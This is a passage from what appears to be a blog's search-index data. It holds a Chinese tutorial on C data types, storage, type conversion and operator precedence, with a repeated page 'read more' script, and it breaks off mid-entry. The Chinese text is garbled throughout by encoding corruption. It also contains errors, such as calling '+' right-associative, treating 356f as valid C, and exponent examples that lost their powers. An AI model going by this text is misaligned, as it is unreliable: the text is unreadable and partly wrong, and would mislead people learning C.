unsignedï¼Œåœ¨å†…å­˜ä¸­å  4 ä¸ªå­—èŠ‚ æ•´å‹å˜é‡åœ¨å†…å­˜ä¸­çš„å­˜æ”¾å½¢å¼å†…å­˜ä¸­çš„æ•´å‹å˜é‡ä»¥äºŒè¿›åˆ¶å­˜å‚¨ï¼Œä¸€ä¸ªå­—èŠ‚ (byte) = 8 ä½ (bit)ã€‚å…¶ä¸­æ•°å€¼æ˜¯ä»¥è¡¥ç è¡¨ç¤ºï¼Œæ­£æ•°çš„è¡¥ç å’ŒåŸç ç›¸åŒï¼Œè´Ÿæ•°çš„è¡¥ç åˆ™æ˜¯å°†è¯¥æ•°çš„ç»å¯¹å€¼çš„äºŒè¿›åˆ¶å½¢å¼æŒ‰ä½å–åå†åŠ ä¸€ã€‚ 1234567ä¾‹å¦‚ï¼šæ±‚-10çš„è¡¥ç 10çš„åŸç ï¼š 00001010å–åï¼š 11110101å†åŠ 1ï¼Œå¾—-10çš„è¡¥ç ï¼š 11110110æç¤ºï¼šç¬¬ä¸€ä½æ˜¯ç¬¦å·ä½ï¼ å®å‹å¸¸é‡çš„è¡¨ç¤ºæ–¹æ³•å®å‹ä¹Ÿç§°ä¸ºæµ®ç‚¹å‹ï¼Œå®å‹å¸¸é‡ä¹Ÿç§°ä¸ºå®æ•°æˆ–è€…æµ®ç‚¹æ•°ã€‚åœ¨ C è¯­è¨€ä¸­ï¼Œæµ®ç‚¹æ•°åªé‡‡ç”¨åè¿›åˆ¶è¡¨ç¤ºï¼Œå…¶ä¸­æœ‰äºŒç§å½¢å¼ï¼šåè¿›åˆ¶å°æ•°å½¢å¼ã€æŒ‡æ•°å½¢å¼ã€‚æ ‡å‡† C è¯­è¨€å…è®¸æµ®ç‚¹æ•°ä½¿ç”¨åç¼€ï¼Œåç¼€ä¸º â€œfâ€ æˆ– â€œFâ€ å³è¡¨ç¤ºè¯¥æ•°ä¸ºæµ®ç‚¹æ•°ï¼Œå¦‚ 356f å’Œ 356. æ˜¯ç­‰ä»·çš„ã€‚ åè¿›åˆ¶æ•°å½¢å¼ï¼šç”±æ•°ç  0~ 9 å’Œå°æ•°ç‚¹ç»„æˆï¼Œä¾‹å¦‚ 0.0ã€25.0ã€5.789ã€0.13ã€5.0ã€300.ã€-267.8230 ç­‰å‡ä¸ºåˆæ³•çš„å®æ•° (å¿…é¡»æœ‰å°æ•°ç‚¹) æŒ‡æ•°å½¢å¼ï¼šç”±åè¿›åˆ¶æ•°ã€é˜¶ç æ ‡å¿— â€œeâ€ æˆ– â€œEâ€ã€é˜¶ç  (åªèƒ½ä¸ºæ•´æ•°ï¼Œå¯ä»¥å¸¦ç¬¦å·) ç»„æˆï¼Œå…¶ä¸€èˆ¬å½¢å¼ä¸ºï¼ša E nï¼ˆa ä¸ºåè¿›åˆ¶æ•°ï¼Œn ä¸ºåè¿›åˆ¶æ•´æ•°ï¼‰ï¼Œä¾‹å¦‚ 2.1E5 (ç­‰äº 2.1105)ã€-2.8E-2 (ç­‰äº - 2.810-2)ã€0.5E7 (ç­‰äº 0.5*107) å®å‹å˜é‡çš„åˆ†ç±»å®å‹å˜é‡åˆ†ä¸ºï¼šå•ç²¾åº¦ï¼ˆfloat å‹ï¼‰ã€åŒç²¾åº¦ï¼ˆdouble å‹ï¼‰å’Œé•¿åŒç²¾åº¦ï¼ˆlong double å‹ï¼‰ä¸‰ç±»ã€‚åœ¨ Turbo C ä¸­å•ç²¾åº¦å‹å  4 ä¸ªå­—èŠ‚ï¼ˆ32 ä½ï¼‰å†…å­˜ç©ºé—´ï¼Œå…¶æ•°å€¼èŒƒå›´ä¸º 3.4E-38ï½3.4E+38ï¼Œåªèƒ½æä¾›ä¸ƒä½æœ‰æ•ˆæ•°å­—ã€‚åŒç²¾åº¦å‹å  8 ä¸ªå­—èŠ‚ï¼ˆ64 ä½ï¼‰å†…å­˜ç©ºé—´ï¼Œå…¶æ•°å€¼èŒƒå›´ä¸º 1.7E-308ï½1.7E+308ï¼Œå¯æä¾› 16 ä½æœ‰æ•ˆæ•°å­—ã€‚ å®å‹å˜é‡åœ¨å†…å­˜ä¸­çš„å­˜æ”¾å½¢å¼å®å‹å˜é‡ä¸€èˆ¬å  4 ä¸ªå­—èŠ‚ (32 ä½) çš„å†…å­˜ç©ºé—´ï¼ŒæŒ‰æŒ‡æ•°å½¢å¼å­˜å‚¨ï¼Œå®æ•° 3.14159 åœ¨å†…å­˜ä¸­çš„å­˜æ”¾å½¢å¼å¦‚ä¸‹ï¼š å°æ•°éƒ¨åˆ†å çš„ä½ (bit) æ•°æ„ˆå¤šï¼Œæ•°çš„æœ‰æ•ˆæ•°å­—æ„ˆå¤šï¼Œç²¾åº¦æ„ˆé«˜ æŒ‡æ•°éƒ¨åˆ†å çš„ä½æ•°æ„ˆå¤šï¼Œåˆ™èƒ½è¡¨ç¤ºçš„æ•°å€¼èŒƒå›´æ„ˆå¤§ å­—ç¬¦å¸¸é‡å­—ç¬¦å¸¸é‡æ˜¯ç”¨å•å¼•å·æ‹¬èµ·æ¥çš„ä¸€ä¸ªå­—ç¬¦ï¼Œä¾‹å¦‚ï¼šâ€™aâ€™ã€â€™bâ€™ã€â€™=â€™ã€â€™+â€™ã€â€™?â€™éƒ½æ˜¯åˆæ³•å­—ç¬¦å¸¸é‡ã€‚åœ¨ C è¯­è¨€ä¸­ï¼Œå­—ç¬¦å¸¸é‡æœ‰ä»¥ä¸‹ç‰¹ç‚¹ï¼š å­—ç¬¦å¸¸é‡åªèƒ½ç”¨å•å¼•å·æ‹¬èµ·æ¥ï¼Œä¸èƒ½ç”¨åŒå¼•å·æˆ–å…¶å®ƒæ‹¬å· å­—ç¬¦å¸¸é‡åªèƒ½æ˜¯å•ä¸ªå­—ç¬¦ï¼Œä¸èƒ½æ˜¯å­—ç¬¦ä¸² å­—ç¬¦å¯ä»¥æ˜¯å­—ç¬¦é›†ä¸­ä»»æ„å­—ç¬¦ï¼Œä½†æ•°å­—è¢«å®šä¹‰ä¸ºå­—ç¬¦å‹ä¹‹åå°±ä¸èƒ½å‚ä¸æ•°å€¼è¿ç®—ã€‚ä¾‹å¦‚â€™5â€™å’Œ 5 æ˜¯ä¸åŒçš„ï¼Œâ€™5â€™æ˜¯å­—ç¬¦å¸¸é‡ï¼Œä¸èƒ½å‚ä¸è¿ç®— è½¬ä¹‰å­—ç¬¦è½¬ä¹‰å­—ç¬¦æ˜¯ä¸€ç§ç‰¹æ®Šçš„å­—ç¬¦å¸¸é‡ï¼Œè½¬ä¹‰å­—ç¬¦ä»¥åæ–œçº¿â€" å¼€å¤´ï¼Œåé¢è·Ÿä¸€ä¸ªæˆ–å‡ ä¸ªå­—ç¬¦ã€‚è½¬ä¹‰å­—ç¬¦å…·æœ‰ç‰¹å®šçš„å«ä¹‰ï¼Œä¸åŒäºå­—ç¬¦åŸæœ‰çš„æ„ä¹‰ï¼Œæ•…ç§° â€œè½¬ä¹‰â€ å­—ç¬¦ã€‚ä¾‹å¦‚ printf å‡½æ•°çš„æ ¼å¼ä¸²ä¸­ç”¨åˆ°çš„ \\n å°±æ˜¯ä¸€ä¸ªè½¬ä¹‰å­—ç¬¦ï¼Œå…¶æ„ä¹‰æ˜¯ â€œå›è½¦æ¢è¡Œâ€ã€‚è½¬ä¹‰å­—ç¬¦ä¸»è¦ç”¨æ¥è¡¨ç¤ºé‚£äº›ç”¨ä¸€èˆ¬å­—ç¬¦ä¸ä¾¿äºè¡¨ç¤ºçš„æ§åˆ¶ä»£ç ã€‚ å­—ç¬¦å˜é‡å­—ç¬¦å˜é‡ç”¨æ¥å­˜å‚¨å­—ç¬¦å¸¸é‡ï¼Œå³å•ä¸ªå­—ç¬¦ã€‚å­—ç¬¦å˜é‡çš„ç±»å‹è¯´æ˜ç¬¦æ˜¯ charï¼Œå­—ç¬¦å˜é‡ç±»å‹å®šä¹‰çš„æ ¼å¼å’Œä¹¦å†™è§„åˆ™éƒ½ä¸æ•´å‹å˜é‡ç›¸åŒã€‚ä¾‹å¦‚ï¼šchar a, b; å­—ç¬¦å˜é‡åœ¨å†…å­˜ä¸­çš„å­˜æ”¾å½¢å¼æ¯ä¸ªå­—ç¬¦å˜é‡è¢«ä¼šè¢«åˆ†é…ä¸€ä¸ªå­—èŠ‚çš„å†…å­˜ç©ºé—´ï¼Œå› æ­¤åªèƒ½å­˜æ”¾ä¸€ä¸ªå­—ç¬¦ã€‚å­—ç¬¦å€¼æ˜¯ä»¥ ASCII ç çš„å½¢å¼å­˜æ”¾åœ¨å˜é‡çš„å†…å­˜å•å…ƒä¹‹ä¸­çš„ï¼Œå¦‚ x çš„åè¿›åˆ¶ ASCII ç æ˜¯ 120ï¼Œy çš„åè¿›åˆ¶ ASCII ç æ˜¯ 121ã€‚è‹¥å¯¹å­—ç¬¦å˜é‡ aã€b åˆ†åˆ«èµ‹äºˆâ€™xâ€™å’Œâ€™yâ€™å€¼ï¼ša =â€˜xâ€™; b = \'y\';ï¼Œå®é™…ä¸Šæ˜¯åœ¨ aã€b ä¸¤ä¸ªå•å…ƒå†…å­˜æ”¾ 120 å’Œ 121 çš„äºŒè¿›åˆ¶å€¼ã€‚ å­—ç¬¦ä¸²å¸¸é‡å­—ç¬¦ä¸²å¸¸é‡æ˜¯ç”±ä¸€å¯¹åŒå¼•å·æ‹¬èµ·çš„å­—ç¬¦åºåˆ—ï¼Œä¾‹å¦‚ï¼šâ€CHINAâ€ã€â€C programâ€ ç­‰éƒ½æ˜¯åˆæ³•çš„å­—ç¬¦ä¸²å¸¸é‡ã€‚å­—ç¬¦ä¸²å¸¸é‡å’Œå­—ç¬¦å¸¸é‡æ˜¯ä¸åŒçš„é‡ï¼Œå®ƒä»¬ä¹‹é—´ä¸»è¦æœ‰ä»¥ä¸‹åŒºåˆ«ï¼š å­—ç¬¦å¸¸é‡ç”±å•å¼•å·æ‹¬èµ·æ¥ï¼Œå­—ç¬¦ä¸²å¸¸é‡ç”±åŒå¼•å·æ‹¬èµ·æ¥ å­—ç¬¦å¸¸é‡åªèƒ½æ˜¯å•ä¸ªå­—ç¬¦ï¼Œå­—ç¬¦ä¸²å¸¸é‡åˆ™å¯ä»¥å«ä¸€ä¸ªæˆ–å¤šä¸ªå­—ç¬¦ å¯ä»¥æŠŠä¸€ä¸ªå­—ç¬¦å¸¸é‡èµ‹äºˆä¸€ä¸ªå­—ç¬¦å˜é‡ï¼Œä½†ä¸èƒ½æŠŠä¸€ä¸ªå­—ç¬¦ä¸²å¸¸é‡èµ‹äºˆä¸€ä¸ªå­—ç¬¦å˜é‡ï¼Œä¾‹å¦‚ï¼šå¯ä»¥æ˜¯ char a = â€˜aâ€™ ä½†ä¸èƒ½æ˜¯ char a = â€œaâ€ å­—ç¬¦å¸¸é‡å ä¸€ä¸ªå­—èŠ‚çš„å†…å­˜ç©ºé—´ï¼Œå­—ç¬¦ä¸²å¸¸é‡å çš„å†…å­˜å­—èŠ‚æ•°ç­‰äºå­—ç¬¦ä¸²çš„å­—èŠ‚æ•°åŠ ä¸€ï¼Œé¢å¤–å¢åŠ çš„ä¸€ä¸ªå­—èŠ‚ç”¨äºå­˜æ”¾å­—ç¬¦ \\0 (ASCII ç ä¸º 0)ï¼Œè¿™æ˜¯å­—ç¬¦ä¸²çš„ç»“æŸæ ‡å¿— è¿ç®—ç¬¦å„ç±»æ•°å€¼å‹æ•°æ®ä¹‹é—´çš„æ··åˆè¿ç®—å˜é‡çš„æ•°æ®ç±»å‹æ˜¯å¯ä»¥è½¬æ¢çš„ï¼Œè½¬æ¢çš„æ–¹æ³•æœ‰ä¸¤ç§ï¼Œä¸€ç§æ˜¯è‡ªåŠ¨è½¬æ¢ï¼Œä¸€ç§æ˜¯å¼ºåˆ¶è½¬æ¢ã€‚è‡ªåŠ¨è½¬æ¢å‘ç”Ÿåœ¨ä¸åŒæ•°æ®ç±»å‹çš„é‡æ··åˆè¿ç®—æ—¶ï¼Œç”±ç¼–è¯‘ç³»ç»Ÿè‡ªåŠ¨å®Œæˆã€‚è‡ªåŠ¨è½¬æ¢éµå¾ªä»¥ä¸‹è§„åˆ™ï¼š è‹¥å‚ä¸è¿ç®—é‡çš„ç±»å‹ä¸åŒï¼Œåˆ™å…ˆè½¬æ¢æˆåŒä¸€ç±»å‹ï¼Œç„¶åè¿›è¡Œè¿ç®— è½¬æ¢æŒ‰æ•°æ®é•¿åº¦å¢åŠ çš„æ–¹å‘è¿›è¡Œï¼Œä»¥ä¿è¯ç²¾åº¦ä¸é™ä½ï¼Œå¦‚ int å‹å’Œ long å‹è¿ç®—æ—¶ï¼Œå…ˆæŠŠ int é‡è½¬æˆ long å‹åå†è¿›è¡Œè¿ç®— æ‰€æœ‰çš„æµ®ç‚¹è¿ç®—éƒ½æ˜¯ä»¥åŒç²¾åº¦è¿›è¡Œçš„ï¼Œå³ä½¿ä»…å« float å•ç²¾åº¦é‡è¿ç®—çš„è¡¨è¾¾å¼ï¼Œä¹Ÿè¦å…ˆè½¬æ¢æˆ double å‹ï¼Œå†ä½œè¿ç®— char å‹å’Œ short å‹å‚ä¸è¿ç®—æ—¶ï¼Œå¿…é¡»å…ˆè½¬æ¢æˆ int å‹ åœ¨èµ‹å€¼è¿ç®—ä¸­ï¼Œèµ‹å€¼å·ä¸¤è¾¹é‡çš„æ•°æ®ç±»å‹ä¸åŒæ—¶ï¼Œèµ‹å€¼å·å³è¾¹é‡çš„ç±»å‹å°†è½¬æ¢ä¸ºå·¦è¾¹é‡çš„ç±»å‹ã€‚å¦‚æœå³è¾¹é‡çš„æ•°æ®ç±»å‹é•¿åº¦æ¯”å·¦è¾¹é•¿æ—¶ï¼Œå°†ä¸¢å¤±ä¸€éƒ¨åˆ†æ•°æ®ï¼Œè¿™æ ·ä¼šé™ä½ç²¾åº¦ï¼Œä¸¢å¤±çš„éƒ¨åˆ†æŒ‰å››èˆäº”å…¥å‘å‰èˆå…¥ï¼Œç±»å‹è‡ªåŠ¨è½¬æ¢çš„è§„åˆ™ä¸ºï¼šdouble &lt;- long &lt;- unsigned &lt;- int &lt;- charã€short è‡ªåŠ¨ç±»å‹è½¬æ¢å¦‚æœèµ‹å€¼è¿ç®—ç¬¦ä¸¤è¾¹çš„æ•°æ®ç±»å‹ä¸ç›¸åŒï¼Œç³»ç»Ÿå°†è‡ªåŠ¨è¿›è¡Œç±»å‹è½¬æ¢ï¼Œå³æŠŠèµ‹å€¼å·å³è¾¹çš„ç±»å‹æ¢æˆå·¦è¾¹çš„ç±»å‹ï¼Œå…·ä½“è§„å®šå¦‚ä¸‹ï¼š å®å‹èµ‹äºˆæ•´å‹ï¼Œèˆå»å°æ•°éƒ¨åˆ† æ•´å‹èµ‹äºˆå®å‹ï¼Œæ•°å€¼ä¸å˜ï¼Œä½†å°†ä»¥æµ®ç‚¹å½¢å¼å­˜æ”¾ï¼Œå³å¢åŠ å°æ•°éƒ¨åˆ† (å°æ•°éƒ¨åˆ†çš„å€¼ä¸º 0) å­—ç¬¦å‹èµ‹äºˆæ•´å‹ï¼Œç”±äºå­—ç¬¦å‹ä¸ºä¸€ä¸ªå­—èŠ‚ï¼Œè€Œæ•´å‹ä¸ºå››ä¸ªå­—èŠ‚ï¼Œæ•…å°†å­—ç¬¦çš„ ASCII ç å€¼æ”¾åˆ°æ•´å‹é‡çš„ä½å…«ä½ä¸­ï¼Œé«˜å…«ä½ä¸º 0ã€‚æ•´å‹èµ‹äºˆå­—ç¬¦å‹ï¼ŒåªæŠŠä½å…«ä½èµ‹äºˆå­—ç¬¦é‡ å¼ºåˆ¶ç±»å‹è½¬æ¢å¼ºåˆ¶ç±»å‹è½¬æ¢æ˜¯é€šè¿‡ç±»å‹è½¬æ¢è¿ç®—æ¥å®ç°çš„ï¼Œå…¶ä¸€èˆ¬å½¢å¼ä¸ºï¼š(ç±»å‹è¯´æ˜ç¬¦) (è¡¨è¾¾å¼)ï¼Œå…¶åŠŸèƒ½æ˜¯æŠŠè¡¨è¾¾å¼çš„è¿ç®—ç»“æœå¼ºåˆ¶è½¬æ¢æˆç±»å‹è¯´æ˜ç¬¦æ‰€è¡¨ç¤ºçš„ç±»å‹ã€‚ä¾‹å¦‚ï¼š (float) a è¡¨ç¤ºæŠŠ a è½¬æ¢ä¸ºæµ®ç‚¹å‹ï¼Œ(int)(x+y) è¡¨ç¤ºæŠŠ x+y çš„ç»“æœè½¬æ¢ä¸ºæ•´å‹ï¼Œåœ¨ä½¿ç”¨å¼ºåˆ¶è½¬æ¢æ—¶åº”æ³¨æ„ä»¥ä¸‹é—®é¢˜ï¼š ç±»å‹è¯´æ˜ç¬¦å’Œè¡¨è¾¾å¼éƒ½å¿…é¡»åŠ æ‹¬å· (å•ä¸ªå˜é‡å¯ä»¥ä¸åŠ æ‹¬å·)ï¼Œå¦‚æŠŠ (int)(x+y) å†™æˆ (int)x+y åˆ™æˆäº†æŠŠ x è½¬æ¢æˆ int å‹ä¹‹åå†ä¸ y ç›¸åŠ äº† æ— è®ºæ˜¯å¼ºåˆ¶è½¬æ¢æˆ–æ˜¯è‡ªåŠ¨è½¬æ¢ï¼Œéƒ½åªæ˜¯ä¸ºäº†æœ¬æ¬¡è¿ç®—çš„éœ€è¦è€Œå¯¹å˜é‡çš„æ•°æ®é•¿åº¦è¿›è¡Œçš„ä¸´æ—¶æ€§è½¬æ¢ï¼Œè€Œä¸æ”¹å˜æ•°æ®è¯´æ˜æ—¶å¯¹è¯¥å˜é‡å®šä¹‰çš„ç±»å‹ åŸºæœ¬çš„ç®—æœ¯è¿ç®—ç¬¦ åŠ æ³•è¿ç®—ç¬¦ â€œ+â€ï¼šåŠ æ³•è¿ç®—ç¬¦ä¸ºåŒç›®è¿ç®—ç¬¦ï¼Œå³åº”æœ‰ä¸¤ä¸ªé‡å‚ä¸åŠ æ³•è¿ç®—ã€‚å¦‚ a+b, 4+8 ç­‰ï¼Œå…·æœ‰å³ç»“åˆæ€§ å‡æ³•è¿ç®—ç¬¦ â€œ-â€ï¼šå‡æ³•è¿ç®—ç¬¦ä¸ºåŒç›®è¿ç®—ç¬¦ï¼Œä½† â€œ-â€ ä¹Ÿå¯ä½œè´Ÿå€¼è¿ç®—ç¬¦ï¼Œæ­¤æ—¶ä¸ºå•ç›®è¿ç®—ï¼Œå¦‚ - x, -5 ç­‰ï¼Œå…·æœ‰å·¦ç»“åˆæ€§ ä¹˜æ³•è¿ç®—ç¬¦ â€œ*â€ï¼šåŒç›®è¿ç®—ï¼Œå…·æœ‰å·¦ç»“åˆæ€§ é™¤æ³•è¿ç®—ç¬¦ â€œ/â€ï¼šåŒç›®è¿ç®—ï¼Œå…·æœ‰å·¦ç»“åˆæ€§ï¼Œå‚ä¸è¿ç®—é‡å‡ä¸ºæ•´å‹æ—¶ï¼Œç»“æœä¹Ÿä¸ºæ•´å‹ï¼Œèˆå»å°æ•°éƒ¨åˆ†ï¼›å¦‚æœè¿ç®—é‡ä¸­æœ‰ä¸€ä¸ªæ˜¯å®å‹ï¼Œåˆ™ç»“æœä¸ºåŒç²¾åº¦å®å‹ è¿ç®—ç¬¦çš„ä¼˜å…ˆçº§ä¸ç»“åˆæ€§ è¿ç®—ç¬¦çš„ä¼˜å…ˆçº§ï¼šC è¯­è¨€ä¸­ï¼Œè¿ç®—ç¬¦çš„è¿ç®—ä¼˜å…ˆçº§å…±åˆ†ä¸º 15 çº§ã€‚1 çº§æœ€é«˜ï¼Œ15 çº§æœ€ä½ã€‚åœ¨è¡¨è¾¾å¼ä¸­ï¼Œä¼˜å…ˆçº§è¾ƒé«˜çš„å…ˆäºä¼˜å…ˆçº§è¾ƒä½çš„è¿›è¡Œè¿ç®—ã€‚è€Œåœ¨ä¸€ä¸ªè¿ç®—é‡ä¸¤ä¾§çš„è¿ç®—ç¬¦ä¼˜å…ˆçº§ç›¸åŒæ—¶ï¼Œåˆ™æŒ‰è¿ç®—ç¬¦çš„ç»“åˆæ€§æ‰€è§„å®šçš„ç»“åˆæ–¹å‘å¤„ç† è¿ç®—ç¬¦çš„ç»“åˆæ€§ï¼šC è¯­è¨€ä¸­å„è¿ç®—ç¬¦çš„ç»“åˆæ€§åˆ†ä¸ºä¸¤ç§ï¼Œå³å·¦ç»“åˆæ€§ (è‡ªå·¦è‡³å³) å’Œå³ç»“åˆæ€§ (è‡ªå³è‡³å·¦)ã€‚ä¾‹å¦‚ç®—æœ¯è¿ç®—ç¬¦çš„ç»“åˆæ€§æ˜¯è‡ªå·¦è‡³å³ï¼Œå³å…ˆå·¦åå³ã€‚å¦‚æœ‰è¡¨è¾¾å¼ x-y+z åˆ™ y åº”å…ˆä¸ â€œ-â€ å·ç»“åˆï¼Œæ‰§è¡Œ x-y è¿ç®—ï¼Œç„¶åå†æ‰§è¡Œ + z çš„è¿ç®—ï¼Œè¿™ç§è‡ªå·¦è‡³å³çš„ç»“åˆæ–¹å‘å°±ç§°ä¸º â€œå·¦ç»“åˆæ€§â€ã€‚è€Œè‡ªå³è‡³å·¦çš„ç»“åˆæ–¹å‘ç§°ä¸º â€œå³ç»“åˆæ€§â€ã€‚ æœ€å…¸å‹çš„å³ç»“åˆæ€§è¿ç®—ç¬¦æ˜¯èµ‹å€¼è¿ç®—ç¬¦ï¼Œå¦‚ x=y=zï¼Œç”±äº â€œ=â€ çš„å³ç»“åˆæ€§ï¼Œåº”å…ˆæ‰§è¡Œ y=z å†æ‰§è¡Œ x=(y=z) è¿ç®—ã€‚C è¯­è¨€è¿ç®—ç¬¦ä¸­æœ‰ä¸å°‘ä¸ºå³ç»“åˆæ€§ï¼Œåº”æ³¨æ„åŒºåˆ«ï¼Œä»¥é¿å…ç†è§£é”™è¯¯ è¿ç®—ç¬¦ä¼˜å…ˆçº§ä¸ç»“åˆæ€§ä¸€è§ˆè¡¨ç‚¹å‡»æŸ¥çœ‹è¿ç®—ç¬¦ä¼˜å…ˆçº§ä¸ç»“åˆæ€§ä¸€è§ˆè¡¨ï¼Œè¡¨ä¸­å¯ä»¥æ€»ç»“å‡ºå¦‚ä¸‹è§„å¾‹ï¼š ç»“åˆæ–¹å‘åªæœ‰ä¸‰ä¸ªæ˜¯ä»å³å¾€å·¦ï¼Œå…¶ä½™éƒ½æ˜¯ä»å·¦å¾€å³ æ‰€æœ‰åŒç›®è¿ç®—ç¬¦ä¸­åªæœ‰èµ‹å€¼è¿ç®—ç¬¦çš„ç»“åˆæ–¹å‘æ˜¯ä»å³å¾€å·¦ å¦å¤–ä¸¤ä¸ªä»å³å¾€å·¦ç»“åˆçš„è¿ç®—ç¬¦ä¹Ÿå¾ˆå¥½è®°ï¼Œå› ä¸ºå®ƒä»¬å¾ˆç‰¹æ®Šï¼šä¸€ä¸ªæ˜¯å•ç›®è¿ç®—ç¬¦ï¼Œä¸€ä¸ªæ˜¯ä¸‰ç›®è¿ç®—ç¬¦ C è¯­è¨€ä¸­æœ‰ä¸”åªæœ‰ä¸€ä¸ªä¸‰ç›®è¿ç®—ç¬¦ é€—å·è¿ç®—ç¬¦çš„ä¼˜å…ˆçº§æœ€ä½ï¼Œè¦è®°ä½ å¯¹äºä¼˜å…ˆçº§ï¼šç®—æœ¯è¿ç®—ç¬¦ &gt; å…³ç³»è¿ç®—ç¬¦ &gt; é€»è¾‘è¿ç®—ç¬¦ &gt; èµ‹å€¼è¿ç®—ç¬¦ï¼Œé€»è¾‘è¿ç®—ç¬¦ä¸­ â€œ!â€ é™¤å¤– è‡ªå¢ã€è‡ªå‡è¿ç®—ç¬¦ è‡ªå¢ 1 è¿ç®—ç¬¦ï¼šè®°ä¸º ++ï¼Œå…¶åŠŸèƒ½æ˜¯ä½¿å˜é‡çš„å€¼è‡ªå¢ 1 è‡ªå‡ 1 è¿ç®—ç¬¦ï¼šè®°ä¸º --ï¼Œå…¶åŠŸèƒ½æ˜¯ä½¿å˜é‡å€¼è‡ªå‡ 1 è‡ªå¢ 1ï¼Œè‡ªå‡ 1 è¿ç®—ç¬¦å‡ä¸ºå•ç›®è¿ç®—ï¼Œéƒ½å…·æœ‰å³ç»“åˆæ€§ï¼Œå¯æœ‰ä»¥ä¸‹å‡ ç§å½¢å¼ï¼š++iï¼Œi è‡ªå¢ 1 åå†å‚ä¸å…¶å®ƒè¿ç®—--iï¼Œi è‡ªå‡ 1 åå†å‚ä¸å…¶å®ƒè¿ç®—i++ï¼Œi å‚ä¸è¿ç®—åï¼Œi çš„å€¼å†è‡ªå¢ 1i--ï¼Œi å‚ä¸è¿ç®—åï¼Œi çš„å€¼å†è‡ªå‡ 1 1234567int i = 8;printf("%d\\n",++i); // æ‰“å°9ï¼Œæ­¤æ—¶i=9printf("%d\\n",--i); // æ‰“å°8ï¼Œæ­¤æ—¶i=8printf("%d\\n",i++); // æ‰“å°8ï¼Œæ­¤æ—¶i=9printf("%d\\n",i--); // æ‰“å°9ï¼Œæ­¤æ—¶i=8printf("%d\\n",-i++); // æ‰“å°-8ï¼Œæ­¤æ—¶i=9printf("%d\\n",-i--); // æ‰“å°-9ï¼Œæ­¤æ—¶i=8 èµ‹å€¼è¿ç®—ç¬¦å’Œèµ‹å€¼è¡¨è¾¾å¼ èµ‹å€¼è¿ç®—ç¬¦è®°ä¸º â€œ=â€ï¼Œç”± â€œ=â€ è¿æ¥çš„å¼å­ç§°ä¸ºèµ‹å€¼è¡¨è¾¾å¼ï¼Œå…¶ä¸€èˆ¬è¡¨ç°å½¢å¼ä¸ºï¼š å˜é‡ = è¡¨è¾¾å¼ï¼Œä¾‹å¦‚ x = a + b èµ‹å€¼è¡¨è¾¾å¼çš„åŠŸèƒ½æ˜¯è®¡ç®—è¡¨è¾¾å¼çš„å€¼å†èµ‹äºˆå·¦è¾¹çš„å˜é‡ï¼Œå› æ­¤èµ‹å€¼è¿ç®—ç¬¦å…·æœ‰å³ç»“åˆæ€§ï¼Œä¾‹å¦‚ a=b=c=5 å¯ç†è§£ä¸º a=(b=(c=5)) å¤åˆçš„èµ‹å€¼è¿ç®—ç¬¦ åœ¨èµ‹å€¼ç¬¦ â€œ=â€ ä¹‹å‰åŠ ä¸Šå…¶å®ƒäºŒç›®è¿ç®—ç¬¦å¯æ„æˆå¤åˆèµ‹å€¼ç¬¦ï¼Œä¾‹å¦‚ +=ã€-=ã€*=ã€/=ã€%=ã€&lt;&lt;=ã€&gt;&gt;=ã€&amp;=ã€^=ã€|= å¤åˆèµ‹å€¼ç¬¦è¿™ç§å†™æ³•ï¼Œååˆ†æœ‰åˆ©äºç¼–è¯‘å¤„ç†ï¼Œèƒ½æé«˜ç¼–è¯‘æ•ˆç‡å¹¶äº§ç”Ÿè´¨é‡è¾ƒé«˜çš„ç›®æ ‡ä»£ç ï¼Œä¾‹å¦‚ a+=5 ç­‰ä»·äº a=a+5ï¼Œr%=p ç­‰ä»·äº r=r%p æœ¬èŠ‚é‡ç‚¹å†…å®¹ æ•´å‹å˜é‡åœ¨å†…å­˜ä¸­çš„å­˜æ”¾å½¢å¼ å®å‹å˜é‡åœ¨å†…å­˜ä¸­çš„å­˜æ”¾å½¢å¼ å­—ç¬¦å˜é‡åœ¨å†…å­˜ä¸­çš„å­˜æ”¾å½¢å¼ å„ç±»æ•°å€¼å‹æ•°æ®ä¹‹é—´çš„æ··åˆè¿ç®— è‡ªåŠ¨ç±»å‹è½¬æ¢ è¿ç®—ç¬¦çš„ä¼˜å…ˆçº§ä¸ç»“åˆæ€§ var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"cè¯­è¨€"},{title:"Linux å¿…è¦å‘½ä»¤æ‘˜è¦",url:"/posts/817c7d82.html",text:'var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"linux åœ¨çº¿ç”µå­ä¹¦"},{title:"Linux ç³»ç»Ÿç¼–ç¨‹ä¹‹ä¸‰ - ç³»ç»Ÿå¸¸ç”¨å‘½ä»¤",url:"/posts/2db9f8a1.html",text:'å‘½ä»¤æ ¼å¼Linux å‘½ä»¤çš„æ ¼å¼ï¼šcommand [-options] [parameter1] ... commandï¼šå‘½ä»¤åç§°ï¼Œç›¸åº”åŠŸèƒ½çš„è‹±æ–‡å•è¯æˆ–å•è¯çš„ç¼©å†™ [-options]ï¼šé€‰é¡¹ï¼Œå¯ç”¨æ¥å¯¹å‘½ä»¤è¿›è¡Œæ§åˆ¶ï¼Œä¹Ÿå¯ä»¥çœç•¥ï¼Œ[] ä»£è¡¨å¯é€‰ parameter1 